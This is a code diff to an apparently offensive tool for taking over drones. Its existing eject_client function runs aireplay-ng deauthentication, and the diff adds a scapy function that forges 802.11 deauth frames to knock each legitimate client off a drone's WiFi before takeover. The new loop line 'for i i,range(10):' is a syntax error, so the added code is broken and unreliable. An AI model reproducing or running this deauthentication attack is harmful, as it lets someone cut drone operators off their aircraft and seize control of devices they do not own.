@@ -1,6 +1,7 @@
 import os, time, sys, csv, re, subprocess
 from scan_clients import *
 from detect_uav import *
+from scapy.all import *
 
 BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'
 
@@ -59,6 +60,12 @@ def eject_client(client_list, mac_drone, drone_essid, iface_mon, channel):
             cmd = "sudo aireplay-ng -0 1 -e {3} -a {0} -c {1} {2} >>/dev/null 2>>/dev/null".format(mac_drone, client.mac, iface_mon, drone_essid)
             os.system(cmd)
 
+#Use scapy to eject client. Still need to be in monitor mode for wifi card.
+def eject_client_scapy(client_list, mac_drone, iface_mon):
+    for client in client_list:
+        deauth = RadioTap()/Dot11(addr1 = client.mac, addr2 = mac_drone, addr3 = mac_drone)/Dot11Deauth()
+        for i i,range(10):
+            sendp(deauth, iface = iface_mon)
 
 def demote():
     os.seteuid(1000)
@@ -91,7 +98,6 @@ def take_control_main(drone, iface):
         mac_drone = drone.bssid
         drone_essid = drone.essid
         iface_mon = iface+"mon"
-        # scan_wifi(iface_mon,drone)
         try :
             channel = find_channel(iface)
             start_airmon(iface)
